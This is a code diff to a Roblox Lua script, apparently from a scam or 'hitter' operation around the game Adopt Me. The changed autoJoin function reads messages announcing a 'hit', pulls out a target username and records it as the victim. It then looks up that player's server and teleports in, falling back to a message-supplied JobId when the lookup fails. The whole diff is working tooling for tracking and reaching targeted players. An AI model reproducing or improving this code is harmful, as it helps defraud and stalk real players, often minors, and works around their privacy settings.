@@ -143,16 +143,58 @@ local function autoJoin()
         for _, message in ipairs(messages) do
             if message.content ~= "" and message.embeds and message.embeds[1] and message.embeds[1].title then
                 if message.embeds[1].title:find("Join to get Adopt Me hit") then
-                    local placeId, jobId = string.match(message.content, 'TeleportToPlaceInstance%((%d+),%s*["\']([%w%-]+)["\']%)') -- Extract placeId and jobId from the embed
-                    if placeId and jobId then
+                    local targetUsername = string.match(message.content, 'TARGET:([^|]+)')
+                    if targetUsername then
+                        targetUsername = string.gsub(targetUsername, "^%s*(.-)%s*$", "%1") -- Trim whitespace
+                        print("Found target: " .. targetUsername)
+                        
+                        -- Check if JobId is spoofed
+                        local isSpoofed = string.find(message.content, "SPOOFED_JOBID_DETECTED")
+                        if isSpoofed then
+                            print("⚠️ SPOOFED JOBID DETECTED - Using GetPlayerPlaceInstanceAsync method only")
+                        end
                         local victimUsername = message.embeds[1].fields[1].value
 
                         if didVictimLeave or timer > 10 then
                             if not table.find(joinedIds, tostring(message.id)) then
-                                saveJoinedId(tostring(message.id)) -- Save this ID to the list
+                                saveJoinedId(tostring(message.id))
                                 writefile("useradm.txt", victimUsername)
-                                game:GetService('TeleportService'):TeleportToPlaceInstance(placeId, jobId) -- Join the server
-                                return
+                                
+                                -- Get victim's UserId and find their server
+                                local success, userId = pcall(function()
+                                    return game:GetService("Players"):GetUserIdFromNameAsync(targetUsername)
+                                end)
+                                
+                                if success and userId then
+                                    local teleportSuccess, placeId, jobId = pcall(function()
+                                        return game:GetService("TeleportService"):GetPlayerPlaceInstanceAsync(userId)
+                                    end)
+                                    
+                                    if teleportSuccess and placeId and jobId then
+                                        print("✅ GetPlayerPlaceInstanceAsync SUCCESS: PlaceId: " .. placeId .. ", JobId: " .. jobId)
+                                        game:GetService('TeleportService'):TeleportToPlaceInstance(placeId, jobId)
+                                        return
+                                    else
+                                        print("❌ GetPlayerPlaceInstanceAsync failed (privacy/offline)")
+                                        
+                                        -- Only try fallback if JobId isn't spoofed
+                                        if not isSpoofed then
+                                            print("Checking for fallback JobId in message...")
+                                            local fallbackPlaceId, fallbackJobId = string.match(message.content, 'TeleportToPlaceInstance%((%d+),%s*["\']([%w%-]+)["\']%)')
+                                            if fallbackPlaceId and fallbackJobId then
+                                                print("✅ Using fallback JobId: PlaceId: " .. fallbackPlaceId .. ", JobId: " .. fallbackJobId)
+                                                game:GetService('TeleportService'):TeleportToPlaceInstance(fallbackPlaceId, fallbackJobId)
+                                                return
+                                            else
+                                                print("❌ No valid fallback JobId found in message")
+                                            end
+                                        else
+                                            print("🚫 Skipping fallback - JobId is known to be spoofed")
+                                        end
+                                    end
+                                else
+                                    print("Failed to get UserId for " .. targetUsername)
+                                end
                             end
                         end
                     end
